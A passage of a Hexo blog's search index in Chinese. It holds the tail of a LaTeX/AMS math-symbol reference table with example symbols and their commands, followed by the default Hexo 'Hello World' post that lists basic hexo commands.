<td>$\Lsh$</td>
<td>\Lsh</td>
<td>$\Rsh$</td>
<td>\Rsh</td>
</tr>
<tr>
<td>$\looparrowleft$</td>
<td>\looparrowleft</td>
<td>$\looparrowright$</td>
<td>\looparrowright</td>
</tr>
<tr>
<td>$\curvearrowleft$</td>
<td>\curvearrowleft</td>
<td>$\curvearrowright$</td>
<td>\curvearrowright</td>
</tr>
<tr>
<td>$\circlearrowleft$</td>
<td>\circlearrowleft</td>
<td>$\circlearrowright$</td>
<td>\circlearrowright</td>
</tr>
<tr>
<td>$\multimap$</td>
<td>\multimap</td>
<td>$\upuparrows$</td>
<td>\upuparrows</td>
</tr>
<tr>
<td>$\downdownarrows$</td>
<td>\downdownarrows</td>
<td>$\upharpoonleft$</td>
<td>\upharpoonleft</td>
</tr>
<tr>
<td>$\upharpoonright$</td>
<td>\upharpoonright</td>
<td>$\downharpoonright$</td>
<td>\downharpoonright</td>
</tr>
<tr>
<td>$\rightsquigarrow$</td>
<td>\rightsquigarrow</td>
<td>$\leftrightsquigarrow$</td>
<td>\leftrightsquigarrow</td>
</tr>
</tbody></table>
<h4 id="AMS-反义二元关系符和箭头"><a href="#AMS-反义二元关系符和箭头" class="headerlink" title="AMS 反义二元关系符和箭头"></a>AMS 反义二元关系符和箭头</h4><table>
<thead>
<tr>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>$\nless$</td>
<td>\nless</td>
<td>$\ngtr$</td>
<td>\ngtr</td>
<td>$\varsubsetneqq$</td>
<td>\varsubsetneqq</td>
</tr>
<tr>
<td>$\lneq$</td>
<td>\lneq</td>
<td>$\gneq$</td>
<td>\gneq</td>
<td>$\varsupsetneqq$</td>
<td>\varsupsetneqq</td>
</tr>
<tr>
<td>$\nleq$</td>
<td>\nleq</td>
<td>$\ngeq$</td>
<td>\ngeq</td>
<td>$\nsubseteqq$</td>
<td>\nsubseteqq</td>
</tr>
<tr>
<td>$\nleqslant$</td>
<td>\nleqslant</td>
<td>$\ngeqslant$</td>
<td>\ngeqslant</td>
<td>$\nsupseteqq$</td>
<td>\nsupseteqq</td>
</tr>
<tr>
<td>$\lneqq$</td>
<td>\lneqq</td>
<td>$\gneqq$</td>
<td>\gneqq</td>
<td>$\nmid$</td>
<td>\nmid</td>
</tr>
<tr>
<td>$\lvertneqq$</td>
<td>\lvertneqq</td>
<td>$\gvertneqq$</td>
<td>\gvertneqq</td>
<td>$\nparallel$</td>
<td>\nparallel</td>
</tr>
<tr>
<td>$\nleqq$</td>
<td>\nleqq</td>
<td>$\ngeqq$</td>
<td>\ngeqq</td>
<td>$\nshortmid$</td>
<td>\nshortmid</td>
</tr>
<tr>
<td>$\lnsim$</td>
<td>\lnsim</td>
<td>$\gnsim$</td>
<td>\gnsim</td>
<td>$\nshortparallel$</td>
<td>\nshortparallel</td>
</tr>
<tr>
<td>$\lnapprox$</td>
<td>\lnapprox</td>
<td>$\gnapprox$</td>
<td>\gnapprox</td>
<td>$\nsim$</td>
<td>\nsim</td>
</tr>
<tr>
<td>$\nprec$</td>
<td>\nprec</td>
<td>$\nsucc$</td>
<td>\nsucc</td>
<td>$\ncong$</td>
<td>\ncong</td>
</tr>
<tr>
<td>$\npreceq$</td>
<td>\npreceq</td>
<td>$\nsucceq$</td>
<td>\nsucceq</td>
<td>$\nvdash$</td>
<td>\nvdash</td>
</tr>
<tr>
<td>$\precneqq$</td>
<td>\precneqq</td>
<td>$\succneqq$</td>
<td>\succneqq</td>
<td>$\nvDash$</td>
<td>\nvDash</td>
</tr>
<tr>
<td>$\precnsim$</td>
<td>\precnsim</td>
<td>$\succnsim$</td>
<td>\succnsim</td>
<td>$\nVdash$</td>
<td>\nVdash</td>
</tr>
<tr>
<td>$\precnapprox$</td>
<td>\precnapprox</td>
<td>$\succnapprox$</td>
<td>\succnapprox</td>
<td>$\nVDash$</td>
<td>\nVDash</td>
</tr>
<tr>
<td>$\subsetneq$</td>
<td>\subsetneq</td>
<td>$\supsetneq$</td>
<td>\supsetneq</td>
<td>$\ntriangleleft$</td>
<td>\ntriangleleft</td>
</tr>
<tr>
<td>$\varsubsetneq$</td>
<td>\varsubsetneq</td>
<td>$\varsupsetneq$</td>
<td>\varsupsetneq</td>
<td>$\ntriangleright$</td>
<td>\ntriangleright</td>
</tr>
<tr>
<td>$\nsubseteq$</td>
<td>\nsubseteq</td>
<td>$\nsupseteq$</td>
<td>\nsupseteq</td>
<td>$\ntrianglelefteq$</td>
<td>\ntrianglelefteq</td>
</tr>
<tr>
<td>$\subsetneqq$</td>
<td>\subsetneqq</td>
<td>$\supsetneqq$</td>
<td>\supsetneqq</td>
<td>$\ntrianglerighteq$</td>
<td>\ntrianglerighteq</td>
</tr>
<tr>
<td>$\nleftarrow$</td>
<td>\nleftarrow</td>
<td>$\nrightarrow$</td>
<td>\nrightarrow</td>
<td>$\nleftrightarrow$</td>
<td>\nleftrightarrow</td>
</tr>
<tr>
<td>$\nLeftarrow$</td>
<td>\nLeftarrow</td>
<td>$\nRightarrow$</td>
<td>\nRightarrow</td>
<td>$\nLeftrightarrow$</td>
<td>\nLeftrightarrow</td>
</tr>
</tbody></table>
<h4 id="AMS-定界符"><a href="#AMS-定界符" class="headerlink" title="AMS 定界符"></a>AMS 定界符</h4><table>
<thead>
<tr>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>$\ulcorner$</td>
<td>\ulcorner</td>
<td>$\urcorner$</td>
<td>\urcorner</td>
<td>$\llcorner$</td>
<td>\llcorner</td>
<td>$\lrcorner$</td>
<td>\lrcorner</td>
</tr>
<tr>
<td>$\lvert$</td>
<td>\lvert</td>
<td>$\rvert$</td>
<td>\rvert</td>
<td>$\lVert$</td>
<td>\lVert</td>
<td>$\rVert$</td>
<td>\rVert</td>
</tr>
</tbody></table>
<h4 id="AMS-其它字符"><a href="#AMS-其它字符" class="headerlink" title="AMS 其它字符"></a>AMS 其它字符</h4><table>
<thead>
<tr>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
<th>示例</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>$\hbar$</td>
<td>\hbar</td>
<td>$\hslash$</td>
<td>\hslash</td>
<td>$\Bbbk$</td>
<td>\Bbbk</td>
</tr>
<tr>
<td>$\square$</td>
<td>\square</td>
<td>$\blacksquare$</td>
<td>\blacksquare</td>
<td>$\circledS$</td>
<td>\circledS</td>
</tr>
<tr>
<td>$\vartriangle$</td>
<td>\vartriangle</td>
<td>$\blacktriangle$</td>
<td>\blacktriangle</td>
<td>$\complement$</td>
<td>\complement</td>
</tr>
<tr>
<td>$\triangledown$</td>
<td>\triangledown</td>
<td>$\blacktriangledown$</td>
<td>\blacktriangledown</td>
<td>$\Game$</td>
<td>\Game</td>
</tr>
<tr>
<td>$\lozenge$</td>
<td>\lozenge</td>
<td>$\blacklozenge$</td>
<td>\blacklozenge</td>
<td>$\bigstar$</td>
<td>\bigstar</td>
</tr>
<tr>
<td>$\angle$</td>
<td>\angle</td>
<td>$\measuredangle$</td>
<td>\measuredangle</td>
<td></td>
<td></td>
</tr>
<tr>
<td>$\diagup$</td>
<td>\diagup</td>
<td>$\diagdown$</td>
<td>\diagdown</td>
<td>$\backprime$</td>
<td>\backprime</td>
</tr>
<tr>
<td>$\nexists$</td>
<td>\nexists</td>
<td>$\Finv$</td>
<td>\Finv</td>
<td>$\varnothing$</td>
<td>\varnothing</td>
</tr>
<tr>
<td>$\eth$</td>
<td>\eth</td>
<td>$\sphericalangle$</td>
<td>\sphericalangle</td>
<td>$\mho$</td>
<td>\mho</td>
</tr>
</tbody></table>
]]></content>
      
        <categories>
            
            <category> 杂谈 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Markdown </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Hello World]]></title>
      <url>/2019/08/30/hello-world/</url>
      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
      
        
    </entry>
    
  
  
</search>
